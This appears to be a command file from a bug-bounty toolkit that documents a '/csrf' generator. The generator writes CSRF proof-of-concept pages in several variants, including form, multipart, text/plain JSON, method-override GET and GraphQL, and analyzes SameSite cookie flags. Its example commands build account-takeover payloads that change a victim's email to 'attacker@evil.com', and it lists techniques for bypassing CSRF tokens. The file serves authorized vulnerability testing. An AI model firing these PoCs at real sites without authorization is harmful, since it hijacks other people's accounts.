---
description: Generate CSRF PoCs and assess SameSite exposure — form/multipart, text/plain JSON, method-override GET, and GraphQL form variants, plus a Set-Cookie SameSite/Secure/HttpOnly analyzer. Offline generator (no requests). Usage: /csrf <url> -p k=v [--json ...] | /csrf --cookie "<Set-Cookie>"
---

# /csrf

Generate copy-paste CSRF PoCs for the shapes that still pay, then validate on two accounts you own.

**Load skill**: `skills/web2-vuln-classes/SKILL.md` §27 (CSRF).

## Generate PoCs

```bash
# Classic form POST + multipart + method-override GET
python3 bughunter/tools/csrf_poc.py -u https://target.com/api/change-email \
  -p email=attacker@evil.com

# Include a token field (to test whether the token is actually enforced)
python3 bughunter/tools/csrf_poc.py -u https://target.com/api/change-email \
  -p email=attacker@evil.com --token-field csrf --token-value TEST

# JSON endpoint that ignores Content-Type
python3 bughunter/tools/csrf_poc.py -u https://target.com/api/profile \
  --json '{"email":"attacker@evil.com"}'

# GraphQL mutation
python3 bughunter/tools/csrf_poc.py -u https://target.com/graphql \
  --graphql-query 'mutation { updateEmail(email:"attacker@evil.com") { id } }'

# Write every applicable variant to files
python3 bughunter/tools/csrf_poc.py -u https://target.com/api/x \
  -p a=1 --json '{"a":1}' --out-dir ./csrf-pocs
```

Variants: `form-urlencoded`, `multipart`, `json-text-plain` (fetch no-cors + `text/plain`),
`method-override-get` (`_method=POST`), `graphql-form`.

## Analyze the session cookie

```bash
python3 bughunter/tools/csrf_poc.py --cookie 'session=abc; SameSite=Lax; Secure; HttpOnly'
```

Reports `samesite`, `secure`, `httponly`, a risk level, and the practical consequence
(Lax still sends cookies on top-level GET; `None` without `Secure` may be rejected).

## What to test after generating

- Token enforced on the **final** state-changing request (not only POST).
- Method override: GET + `_method=POST`, `X-HTTP-Method-Override`.
- Content-type confusion: JSON body as `text/plain` / form-urlencoded.
- Duplicate params/tokens; token reuse across users/actions.
- SameSite=Lax + state-changing GET; login CSRF.
- GraphQL mutations accepting form content-type with no token.
- WebSocket handshake without an Origin check (see WebSocket reference).

## Validation

Two owned accounts, a victim session, an auto-submitting PoC served from a **different origin**, and the
state change observed from the victim account. Login CSRF: show the victim is in the attacker's account.

## False-positive gate

- Token checked server-side on the final action.
- `SameSite=Strict` and no state-changing GET.
- Endpoint requires a custom header that triggers a preflight the server rejects.
- The action is a no-op or only affects the attacker's own account.
- Re-authentication/password confirmation is required.

## Handoffs

`web2-vuln-classes/references/parser-differential-bypass.md` (method/body disagreements),
`web2-vuln-classes/references/websocket-postmessage.md` (WS/PostMessage),
`triage-validation` → `report-writing`.